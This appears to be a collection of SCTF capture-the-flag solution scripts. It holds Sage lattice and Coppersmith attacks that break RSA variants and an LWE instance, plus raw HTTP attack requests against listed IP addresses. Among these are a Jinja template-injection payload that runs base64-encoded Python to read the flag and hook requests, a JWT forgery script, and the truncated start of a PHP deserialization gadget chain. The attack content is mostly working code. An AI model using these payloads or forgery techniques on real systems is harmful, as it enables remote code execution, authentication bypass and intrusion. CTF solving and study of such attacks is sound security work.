res = solve([f1,f2],[p,q])
for root in res:
    p = root[0].rhs()
    q = root[1].rhs()
    try:
        bp = long_to_bytes(int(p))
        bq = long_to_bytes(int(q))
        FLAG1 = 'SCTF{'+md5(bp).hexdigest()+'}'
        FLAG2 = 'SCTF{'+md5(bq).hexdigest()+'}'
        print(FLAG1)
        print(FLAG2)
    
except:
        pass
    
"""
SCTF{b3e6bcbb38a363c6189e8fcc4ef5350e}
SCTF{12899cda850fc484de8bce978839620d}
SCTF{12899cda850fc484de8bce978839620d}
SCTF{b3e6bcbb38a363c6189e8fcc4ef5350e}
"""
30 82 08 15
    02 82 03 80
067f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f2248
6cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08e
a52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd
07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd689
0a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11
ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b5
03880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5
be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd784
1096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3f
bb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2
142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b2
58d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b
83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2
dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606
a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be8505
4faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08
699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f9732807
0c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103
c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e904638
5356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad94181
2d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32
bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042
b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c9
02b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e
2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3
d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40
ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb208
9bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5
    02 03
        01 00 01
    02 82 03
8004000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
00
    02 81 81 00
8063d0a21876e5ce1e2101c20015529066ed9976882d1002a29efe0f2fdfcc27
43fc9a4b5b651cc97108699eca2fb1f3d93175bae343e7c92e4a41c72d05e570
1940000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
    02 81 81 00
e4f0fe49f9ae1492c097a0a988fa71876625fe4fce05b0204f1fdf43ec64b4da
c699d28e166efdfc7562d19e58c3493d9100365cf2840b46c0f6ee8d96480717
0ff2c13c4eb8012ecab37862a390000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000
# sage 10.3
import itertools
from Crypto.Util.number import *

def small_roots(f, bounds, m=1, d=None):
    if not d:
        d = f.degree()
    R = f.base_ring()
    N = R.cardinality()
    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)
    G = Sequence([], f.parent())
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)
    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)
    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)
    B = B.dense_matrix().LLL()
    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)
    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
    return []

n = int("06 7f 0a a4 e9 74 a6 3a 1f fe 8d 5c 23 e5 d3 c4 31 65 3a e4 1c c7 46 f3 05 f6 2a 9f 19 3f 22 48 6c b7 ef 1b 27 56 34 81 8f 46 d0 75 2a 51 39 e1 99 18 27 1f a0 d7 d2 7b c6 60 d2 b7 24 14 d0 8e a5 2c 88 37 f9 49 c7 ba ec c3 02 9b a3 17 27 ef 3b f1 20 d9 92 6c 02 d7 41 2f 18 7e 98 dc 56 dd 07 b9 87 d2 cc 19 1a d5 61 64 a1 44 f2 8b 2f 70 a1 5d 10 55 88 a4 f2 7f bb 28 91 fc 52 7b d6 89 0a 5f 79 5b 5c 48 47 6a 6b f9 df b6 7b 7e 1e bc 7b 1b 08 6c d2 8b 58 c6 89 55 bf df 44 ec ce 11 ff ac df 65 45 51 b1 59 b7 83 20 40 cc 28 ee 8e be a4 8f 86 72 d5 3e 3d e8 8f cf bb 5f b2 76 b5 03 88 0d d3 4d 59 93 33 5d df 8c cb 96 c1 b4 d7 9f 50 2d 72 10 47 65 ad 9c 2b 18 58 a1 7a f3 d5 be 44 fa 3c bf 4b 8e eb 94 2a a3 94 2a 38 71 d2 c6 5a c7 02 89 12 3f c2 e9 f9 b2 5c bf cb d7 84 10 96 06 0f a5 04 c3 a0 7b 59 14 93 c6 4c 88 d0 bb 45 28 5a 85 b5 f7 d5 9d b9 8f aa 00 c2 cd 3f bb 63 da 59 92 05 f1 ca b0 df 52 cf 7b 43 1a 0e e4 a7 e3 56 96 54 6c e9 d0 3e f5 95 ec ee 92 d2 14 2c 92 e9 7d 27 44 93 97 03 45 5b 4c 70 de c2 7c 32 1e c6 b8 3c 02 96 22 e8 3a 9e 0d 55 d0 b2 58 d9 5d 4e 61 29 18 65 dd a7 6d c6 19 fc e9 57 79 90 42 9c 6e 77 e9 d4 07 81 e3 b2 f4 49 70 1b 83 e8 b0 c6 c6 6e b3 80 f9 64 73 e5 d4 22 ef ee 8b 2b 0e 88 b7 16 b0 0a 79 c9 d5 14 ca 3a d9 d2 de e5 26 60 9f f9 54 17 32 a4 19 8d 11 b9 db fb b2 e5 5c 24 d8 0e a5 22 d0 78 6e 33 55 f2 36 06 a5 d3 8a 72 de 4e ef c8 b6 bf c4 82 24 8a 28 62 cb 69 d8 e0 e3 d3 16 59 7d a9 d8 08 28 be 85 05 4f af 15 fc 36 9c aa ca fb 81 5c 69 73 c1 71 94 06 83 d5 6a 1a 19 67 b0 9b 7f fa 3f be 5b 2e 08 69 97 59 d8 4d 71 60 3f 51 64 47 69 6b b2 73 22 a6 9f 39 f6 ca 25 3e 00 dc 95 55 d5 f9 73 28 07 0c 46 7f 36 63 cc 48 9a ad 13 0f 28 c4 2f 35 bf 88 c5 71 92 0a b9 2a cb 8f 75 d0 3e 35 a7 51 03 c5 bd 96 f0 61 c9 6b d0 2a f6 e1 d1 91 b0 dd 16 4b c7 21 37 70 03 ed bf 5d 3e f6 5a 5e 90 46 38 53 56 b5 21 62 3b ee 37 f1 64 85 0a 0a 7a fb 0e d4 e7 e8 bd 9a fe 12 98 f7 d5 32 bc 9a d9 41 81 2d 33 2a ec e7 5d 1c cc b1 ff 69 fd 42 b3 1f 24 8a e5 79 d9 e0 d6 a1 4b 05 46 e7 84 ba 94 0e 32 bd 01 c3 95 df 8f f4 58 40 40 46 2b 54 79 fa 07 33 6d 50 3d c3 32 e7 0f c0 6d 94 63 29 7f c0 42 b6 23 d5 6f 87 ef aa 52 5a 9b 58 0e 31 4d 90 d1 21 18 93 ed 40 7a 26 50 8d ea a0 a1 3c 9e e8 c9 02 b9 e1 c3 a0 2f e9 a5 14 52 c0 2e e7 bd cc 85 c0 ef f6 38 91 e2 47 03 bd 26 5d 9c 9d bf 45 6e 2a f9 40 95 38 bc e0 fe cc 7e ba b2 02 66 aa ab 06 c7 66 c3 ea 6c da 9c b9 ba 5e 1d 02 4b 7d c3 d7 3e 76 f6 a3 33 19 7b ad 87 c4 fb 34 d5 65 a0 01 4a ac 72 82 5e 41 ad cf ea da dc 87 ac ef 40 ad 84 b7 c5 56 91 ab ad 56 1b e0 55 0e a0 a9 88 47 0c 42 74 32 ac b8 fe b2 b9 d2 d2 59 8f b2 08 9b b9 1b bd 9c b1 99 e8 92 d3 61 64 d8 bf 3e cd 54 57 6a 97 13 40 47 a1 2d a8 42 07 48 5b b4 e5".replace(" ",""),16)
c = 145554802564989933772666853449758467748433820771006616874558211691441588216921262672588167631397770260815821197485462873358280668164496459053150659240485200305314288108259163251006446515109018138298662011636423264380170119025895000021651886702521266669653335874489612060473962259596489445807308673497717101487224092493721535129391781431853820808463529747944795809850314965769365750993208968116864575686200409653590102945619744853690854644813177444995458528447525184291487005845375945194236352007426925987404637468097524735905540030962884807790630389799495153548300450435815577962308635103143187386444035094151992129110267595908492217520416633466787688326809639286703608138336958958449724993250735997663382433125872982238289419769011271925043792124263306262445811864346081207309546599603914842331643196984128658943528999381048833301951569809038023921101787071345517702911344900151843968213911899353962451480195808768038035044446206153179737023140055693141790385662942050774439391111437140968754546526191031278186881116757268998843581015398070043778631790328583529667194481319953424389090869226474999123124532354330671462280959215310810005231660418399403337476289138527331553267291013945347058144254374287422377547369897793812634181778309679601143245890494670013019155942690562552431527149178906855998534415120428884098317318129659099377634006938812654262148522236268027388683027513663867042278407716812565374141362015467076472409873946275500942547114202939578755575249750674734066843408758067001891408572444119999801055605577737379889503505649865554353749621313679734666376467890526136184241450593948838055612677564667946098308716892133196862716086041690426537245252116765796203427832657608512488619438752378624483485364908432609100523022628791451171084583484294929190998796485805496852608557456380717623462846198636093701726099310737244471075079541022111303662778829695340275795782631315412134758717966727565043332335558077486037869874106819581519353856396937832498623662166446395755447101393825864584024239951058366713573567250863658531585064635727070458886746791722270803893438211751165831616861912569513431821959562450032831904268205845224077709362068478
ph = int("80 63 d0 a2 18 76 e5 ce 1e 21 01 c2 00 15 52 90 66 ed 99 76 88 2d 10 02 a2 9e fe 0f 2f df cc 27 43 fc 9a 4b 5b 65 1c c9 71 08 69 9e ca 2f b1 f3 d9 31 75 ba e3 43 e7 c9 2e 4a 41 c7 2d 05 e5 70 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ".replace(" ",""),16)
qh = int("e4 f0 fe 49 f9 ae 14 92 c0 97 a0 a9 88 fa 71 87 66 25 fe 4f ce 05 b0 20 4f 1f df 43 ec 64 b4 da c6 99 d2 8e 16 6e fd fc 75 62 d1 9e 58 c3 49 3d 91 00 36 5c f2 84 0b 46 c0 f6 ee 8d 96 48 07 17 0f f2 c1 3c 4e b8 01 2e ca b3 78 62 a3 90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00".replace(" ",""),16)
e = 65537

R.<x,y> = PolynomialRing(Zmod(n))
f = (ph + x)^5 * (qh + y)^2
res = small_roots(f,(2^496,2^400),m=2,d=3)
print(res)
root = res[0]
p = ph + root[0]
q = qh + root[1]

phi = p^4*(p-1)*q*(q-1)
d = inverse(e,phi)
m = pow(c,d,n)
print(long_to_bytes(m))
# SCTF{0ne_4rgum3nt_1s_r0tt3n_0r4ng3s,_th3_wh0le_cert1fic4t3_1s_r0tt3n_0r4ng3s:XD}
30 82 01 1e 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82 01 0b 00 30 82 01 06
    02 81 80
1b5d4fe0aa6782e275d4ce12a6d57562efbbe7db6f5277255b891729bfa2a18d
3edb49843d7989a37b9516be2df8ca939058e65f64b5fb2071bea4f5f8d13928
95b32bf0377d99f4f79979125e5db01cdb5080a1c2d665c9ac31b5823025499c
9513277bae5e7a846cd271c4396e2ba219020e58a9055cb18a28d36a00bf717b
    02 81 80
079f5ccc665767b4a257e5c1ff56e9803df2e5650302daad420105fe67244774
3bd3f0bea1c46a4987932e9a886ca87a7afd7796abf1e5629c4986fe4f22e89c
dce7abb06624465146a2e2b6ca9ab3196ceab7467974c1dc45608a200411b291
fdaf99f7d80dce4db3566f4a9e2e574c6224cd07d80638d28f7820bcf4b49143
30 82 01 1e 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82 01 0b 00 30 82 01 06
    02 81 80
071c324e8769493187c15f72d5cc695729b48488ee3fbd01db00d5c478f08c7c
f32093ba61745051d3e9d169523aa91438181f47679aff5edd22950f74a1eb14
43320aaa5d97f5c1e81b5ef9a3e69ba669abc4c6c4b405f5088a603a74f9bcef
88823b4523574114c810600838728196f8e5e0d4aeeeeab79dd8683a72f3c017
    02 81 80
079f5ccc665767b4a257e5c1ff56e9803df2e5650302daad420105fe67244774
3bd3f0bea1c46a4987932e9a886ca87a7afd7796abf1e5629c4986fe4f22e89c
dce7abb06624465146a2e2b6ca9ab3196ceab7467974c1dc45608a200411b291
fdaf99f7d80dce4db3566f4a9e2e574c6224cd07d80638d28f7820bcf4b49143
from sage.all import *
import itertools

# display matrix picture with 0 and X
def matrix_overview(BB):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += ' ' if BB[ii, jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        print(a)

def dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt):
    '''
    Attack to Dual RSA: Liqiang et al.'s attack implementation
    '''

    N = (n1 + n2) // 2
    A = ZZ(floor(N^0.5))

    _XX = ZZ(floor(N^delta))
    _YY = ZZ(floor(N^0.5))
    _ZZ = ZZ(floor(N^(delta - 1./4)))
    _UU = _XX * _YY + 1

    # Find a "good" basis satisfying d = a1 * l'11 + a2 * l'21
    M = Matrix(ZZ, [[A, e], [0, n1]])
    B = M.LLL()
    l11, l12 = B[0]
    l21, l22 = B[1]
    l_11 = ZZ(l11 / A)
    l_21 = ZZ(l21 / A)

    modulo = e * l_21
    F = Zmod(modulo)

    PR = PolynomialRing(F, 'u, x, y, z')
    u, x, y, z = PR.gens()

    PK = PolynomialRing(ZZ, 'uk, xk, yk, zk')
    uk, xk, yk, zk = PK.gens()

    # For transform xy to u-1 (unravelled linearlization)
    PQ = PK.quo(xk*yk+1-uk)

    f = PK(x*(n2 + y) - e*l_11*z + 1)
    fbar = PQ(f).lift()

    # Polynomial construction
    gijk = {}
    for k in range(0, mm + 1):
        for i in range(0, mm - k + 1):
            for j in range(0, mm - k - i + 1):
                gijk[i, j, k] = PQ(xk^i * zk^j * PK(fbar) ^ k * modulo^(mm-k)).lift()

    hjkl = {}
    for j in range(1, tt + 1):
        for k in range(floor(mm / tt) * j, mm + 1):
            for l in range(0, k + 1):
                hjkl[j, k, l] = PQ(yk^j * zk^(k-l) * PK(fbar) ^ l * modulo^(mm-l)).lift()

    monomials = []
    for k in gijk.keys():
        monomials += gijk[k].monomials()
    for k in hjkl.keys():
        monomials += hjkl[k].monomials()

    monomials = sorted(set(monomials))[::-1]
    assert len(monomials) == len(gijk) + len(hjkl)  # square matrix?
    dim = len(monomials)

    # Create lattice from polynomial g_{ijk} and h_{jkl}
    M = Matrix(ZZ, dim)
    row = 0
    for k in gijk.keys():
        for i, monomial in enumerate(monomials):
            M[row, i] = gijk[k].monomial_coefficient(monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ)
        row += 1
    for k in hjkl.keys():
        for i, monomial in enumerate(monomials):
            M[row, i] = hjkl[k].monomial_coefficient(monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ)
        row += 1

    matrix_overview(M)
    print('=' * 128)

    # LLL
    B = M.LLL()

    matrix_overview(B)

    # Construct polynomials from reduced lattices
    H = [(i, 0) for i in range(dim)]
    H = dict(H)
    for j in range(dim):
        for i in range(dim):
            H[i] += PK((monomials[j] * B[i, j]) / monomials[j].subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ))
    H = list(H.values())

    PQ = PolynomialRing(QQ, 'uq, xq, yq, zq')
    uq, xq, yq, zq = PQ.gens()

    # Inversion of unraveled linearization
    for i in range(dim):
        H[i] = PQ(H[i].subs(uk=xk*yk+1))

    # Calculate Groebner basis for solve system of equations
    I = Ideal(*H[1:20])
    g = I.groebner_basis('giac')[::-1]
    mon = list(map(lambda t: t.monomials(), g))

    PX = PolynomialRing(ZZ, 'xs')
    xs = PX.gen()

    x_pol = y_pol = z_pol = None

    for i in range(len(g)):
        if mon[i] == [xq, 1]:
            print(g[i] / g[i].lc())
            x_pol = g[i] / g[i].lc()
        elif mon[i] == [yq, 1]:
            print(g[i] / g[i].lc())
            y_pol = g[i] / g[i].lc()
        elif mon[i] == [zq, 1]:
            print(g[i] / g[i].lc())
            z_pol = g[i] / g[i].lc()

    if x_pol is None or y_pol is None or z_pol is None:
        print('[-] Failed: we cannot get a solution...')
        return

    x0 = x_pol.subs(xq=xs).roots()[0][0]
    y0 = y_pol.subs(yq=xs).roots()[0][0]
    z0 = z_pol.subs(zq=xs).roots()[0][0]

    # solution check
    assert f(x0 * y0 + 1, x0, y0, z0) % modulo == 0

    a0 = z0
    a1 = (x0 * (n2 + y0) + 1 - e * l_11 * z0) / (e * l_21)

    d = a0 * l_11 + a1 * l_21
    return d

if __name__ == '__main__':
    delta = 0.334
    mm = 4
    tt = 2

    n1 = int("1b 5d 4f e0 aa 67 82 e2 75 d4 ce 12 a6 d5 75 62 ef bb e7 db 6f 52 77 25 5b 89 17 29 bf a2 a1 8d 3e db 49 84 3d 79 89 a3 7b 95 16 be 2d f8 ca 93 90 58 e6 5f 64 b5 fb 20 71 be a4 f5 f8 d1 39 28 95 b3 2b f0 37 7d 99 f4 f7 99 79 12 5e 5d b0 1c db 50 80 a1 c2 d6 65 c9 ac 31 b5 82 30 25 49 9c 95 13 27 7b ae 5e 7a 84 6c d2 71 c4 39 6e 2b a2 19 02 0e 58 a9 05 5c b1 8a 28 d3 6a 00 bf 71 7b ".replace(" ",""),16)
    e = int("07 9f 5c cc 66 57 67 b4 a2 57 e5 c1 ff 56 e9 80 3d f2 e5 65 03 02 da ad 42 01 05 fe 67 24 47 74 3b d3 f0 be a1 c4 6a 49 87 93 2e 9a 88 6c a8 7a 7a fd 77 96 ab f1 e5 62 9c 49 86 fe 4f 22 e8 9c dc e7 ab b0 66 24 46 51 46 a2 e2 b6 ca 9a b3 19 6c ea b7 46 79 74 c1 dc 45 60 8a 20 04 11 b2 91 fd af 99 f7 d8 0d ce 4d b3 56 6f 4a 9e 2e 57 4c 62 24 cd 07 d8 06 38 d2 8f 78 20 bc f4 b4 91 43".replace(" ",""),16)
    n2 = int("07 1c 32 4e 87 69 49 31 87 c1 5f 72 d5 cc 69 57 29 b4 84 88 ee 3f bd 01 db 00 d5 c4 78 f0 8c 7c f3 20 93 ba 61 74 50 51 d3 e9 d1 69 52 3a a9 14 38 18 1f 47 67 9a ff 5e dd 22 95 0f 74 a1 eb 14 43 32 0a aa 5d 97 f5 c1 e8 1b 5e f9 a3 e6 9b a6 69 ab c4 c6 c4 b4 05 f5 08 8a 60 3a 74 f9 bc ef 88 82 3b 45 23 57 41 14 c8 10 60 08 38 72 81 96 f8 e5 e0 d4 ae ee ea b7 9d d8 68 3a 72 f3 c0 17 ".replace(" ",""),16)
    c = bytes_to_long(open("ciphertext.txt",'rb').read())

    d = dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt)
    print(f"d = {d}")
    m1 = pow(c,int(d),n1)
    m2 = pow(c,int(d),n2)
    flag1 = long_to_bytes(m1)
    flag2 = long_to_bytes(m2)
    
    print(flag1)
    print(flag2)
    # SCTF{Ju5t_3njoy_th3_Du4l_4nd_Copper5m1th_m3thod_w1th_Ur_0wn_1mplem3nt4t10n}
# sage 10.3
from sage.groups.perm_gps.permgroup_named import SymmetricGroup
from sage.all import *
from random import choices
import json
from Crypto.Util.number import *

q = 65537
Sn = SymmetricGroup(5*5)
Per = (1,23,2,13,3,16,15,6,22,18,14,4,25,11,20,24,21,9,5,17,7,19,10,12,8)

P = PermutationGroupElement(Per)
PM = Matrix(GF(q),P.matrix())

f1 = open("LinearARTs/output.txt",'r').read()
data1 = json.loads(f1)
f2 = open("LinearARTs/D.matrix",'r').read()
data2 = json.loads(f2)

AA = Matrix(GF(q),eval(data1['AA']))
b = vector(GF(q),eval(data1['b']))
D = Matrix(GF(q),eval(data2['D']))

# AA = A*D*PM
A = AA * PM.inverse() * D.inverse()

def primal_attack2(A,b,m,n,p,esz):
    L = block_matrix(
        [
            [matrix(Zmod(p), A).T.echelon_form().change_ring(ZZ), 0],
            [matrix.zero(m - n, n).augment(matrix.identity(m - n) * p), 0],
            [matrix(ZZ, b), 1],
        ]
    )
    Q = diagonal_matrix([1]*m + [esz])
    L *= Q
    L = L.LLL()
    L /= Q
    for res in L:
        if(res[-1] == 1):
            e = vector(GF(p), res[:m])
        elif(res[-1] == -1):
            e = -vector(GF(p), res[:m])
        
        s = matrix(Zmod(p), A).solve_right((vector(Zmod(p), b) - e))
        
        ss = vector(ZZ,s).list()
        msg = 0
        for i in range(len(ss)):
            msg += ss[i] * 65537**i

        flag = long_to_bytes(int(msg))
        if b"SCTF" in flag:
            print(flag)
            return
        
m = 625
n = 25
primal_attack2(A,b,m,n,q,1)
# SCTF{HunYu4n_TaiChi-5tyl3_P3rmut4t10nProup_m4st3r}
POST /register HTTP/1.1
Host: 124.220.229.60:
8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://124.220.229.60:
8080/register
Content-Type: application/json
Content-Length: 42
Origin: http://124.220.229.60:
8080
Connection: close
Priority: u=0

{"username":"admin§1§","password":"admin123"}
import time
from datetime import datetime

# 指定时间字符串
time_string = "Sun, 29 Sep 2024 06:03:45 GMT"  

# 转换为时间戳
timestamp = int(time.mktime(time.strptime(time_string, "%a, %d %b %Y %H:%M:%S %Z")))

# 打印时间戳
print(timestamp)
import json
import hashlib
import base64
import jwt
from app import *
from User import *

def generateToken(user):
    secret={"name":
user,"is_admin":"1"}
    
    verify_c=jwt.encode(secret, secret_key, algorithm='HS256')
    infor={"name":
user,"secret":
verify_c}
    token=base64.b64encode(json.dumps(infor).encode()).decode()
    print(infor)
    print(token)

secret_key="1727589825"
generateToken('admin2060')
POST /removeUser HTTP/1.1
Host: 1.95.40.5:
29351
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Cookie: Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==
Referer: http://124.220.229.60:
8080/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://124.220.229.60:
8080
Connection: close
Priority: u=0

username=admin§1§
POST /admin HTTP/1.1
Host: 1.95.40.5:
29351
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://124.220.229.60:
8080/register
Cookie: Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==
Content-Type: application/x-www-form-urlencoded
Content-Length: 323
Origin: http://124.220.229.60:
8080
Connection: close
Priority: u=0

code={{(g.pop.__globals__.__builtins__.__getitem__('EXEC'.lower()))("import+base64;ex"%2b"ec(base64.b64decode('X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhIDpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCcvcmVhZGZsYWcnKS5yZWFkKCkp'));")}}
POST /api/upload/image HTTP/1.1
Host: 1.95.73.253
Origin: http://1.95.73.253
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysy0Y2k0enM8x2GrW
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZSIsImlzcyI6IjEuOTUuNzMuMjUzIiwiYXVkIjoiMS45NS43My4yNTMiLCJpYXQiOjE3Mjc0OTcxMzIsIm5iZiI6MTcyNzQ5NzEzMiwiZXhwIjoxNzMwMDg5MTMyLCJqdGkiOnsiaWQiOjI3LCJ0eXBlIjoiYXBpIn19.Ib3JS719JIqEqYNk8kY4pv8_YSoGBd76P7hOKuTKMnU
Referer: http://1.95.73.253/order_detail?orderId=cp362937263153264207&order_type=
Accept: */*
Cookie: cb_lang=zh-cn; PHPSESSID=d2c1afcdb1e2b4e18908373233edd1ec; logo=http%3A%2F%2F1.95.73.253%2Fstatics%2Fsystem_images%2Fpc_logo.png; titles=; auth.strategy=local1; auth._refresh_token.local1=false; auth._token.local1=Bearer%20eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZSIsImlzcyI6IjEuOTUuNzMuMjUzIiwiYXVkIjoiMS45NS43My4yNTMiLCJpYXQiOjE3Mjc0OTcxMzIsIm5iZiI6MTcyNzQ5NzEzMiwiZXhwIjoxNzMwMDg5MTMyLCJqdGkiOnsiaWQiOjI3LCJ0eXBlIjoiYXBpIn19.Ib3JS719JIqEqYNk8kY4pv8_YSoGBd76P7hOKuTKMnU; unreadKefu=0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Length: 214144

------WebKitFormBoundarysy0Y2k0enM8x2GrW
Content-Disposition: form-data; name="file"; filename="111.jpg"
Content-Type: image/jpeg

aaa
------WebKitFormBoundarysy0Y2k0enM8x2GrW--
<?php

namespace PhpOfficePhpSpreadsheetCollection{
    class Cells{
        private $cache;
        public function __construct($exp){
            $this->cache = $exp;
        }
    }
}

namespace thinklog{
    class Channel{
        protected $logger;
        protected $lazy = true;

        public function __construct($exp){
            $this->logger = $exp;
            $this->lazy = false;
        }
    }
}

namespace think{
    class Request{
        protected $url;
        public function __construct(){
